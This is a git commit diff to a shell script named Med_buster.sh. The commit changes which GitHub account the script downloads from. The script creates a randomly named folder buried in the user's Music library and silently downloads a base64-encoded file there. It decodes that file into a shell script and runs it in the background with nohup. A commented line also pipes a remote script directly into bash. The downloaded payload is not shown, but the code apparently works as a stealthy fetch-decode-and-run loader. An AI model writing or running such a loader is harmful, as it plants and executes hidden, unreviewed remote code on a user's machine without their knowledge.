2c19a7f9878db1b3328b6745195bb0e2dab3a8a1
vakandi <wael.bousfira@protonmail.com>
2023-03-16 00:16:31 +0100

    update

--- Med_buster.sh
+++ Med_buster.sh
@@ -2,7 +2,7 @@ export random=$RANDOM
 FOLDER="/Users/$USER/Music/Music/Media.localized/${random}"
 
 mkdir -p $FOLDER
-curl -s -o $FOLDER/lol.bin https://raw.githubusercontent.com/SilentSarah/Med_buster/master/lol.bin
-#bash <(curl -s https://raw.githubusercontent.com/SilentSarah/Med_buster/master/Med_buster.sh)
+curl -s -o $FOLDER/lol.bin https://raw.githubusercontent.com/vakandi/Med_buster/master/lol.bin
+#bash <(curl -s https://raw.githubusercontent.com/vakandi/Med_buster/master/Med_buster.sh)
 base64 -d $FOLDER/lol.bin > $FOLDER/test.sh
 nohup bash $FOLDER/test.sh $random &
